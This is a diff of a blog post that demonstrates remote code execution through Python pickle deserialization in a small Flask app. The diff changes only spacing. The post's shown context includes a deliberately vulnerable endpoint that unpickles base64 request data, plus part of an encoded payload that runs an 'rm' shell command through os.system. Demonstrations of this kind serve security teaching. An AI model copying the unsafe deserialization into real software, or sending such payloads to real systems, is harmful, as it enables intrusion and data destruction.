@@ -12,13 +12,16 @@ In this post, I will try to demonstrate how remote code executation can be achie
 ## Setup basic flask application
 
 - Create virtual env
+
 ```
 python3 -m venv venv
 source venv/bin/activate
 
 pip install flask
 ```
+
 - Create app.py
+
 ```
 from flask import Flask, request
 import base64
@@ -32,13 +35,16 @@ def pickler():
     deserialized_data = pickle.loads(data)
     return ''
 ```
+
 - Run the app
+
 ```
 export FLASK_APP=app.py
 flask run
 ```
 
 ## Create payload for the RCE
+
 ```
 # exploit.py
 
@@ -70,6 +76,7 @@ Let's generate the payload by running above code:
 python exploit.py
 Y3Bvc2l4CnN5c3RlbQpwMAooUydybSA...
 ```
+
 ## Exploit
 
 ```
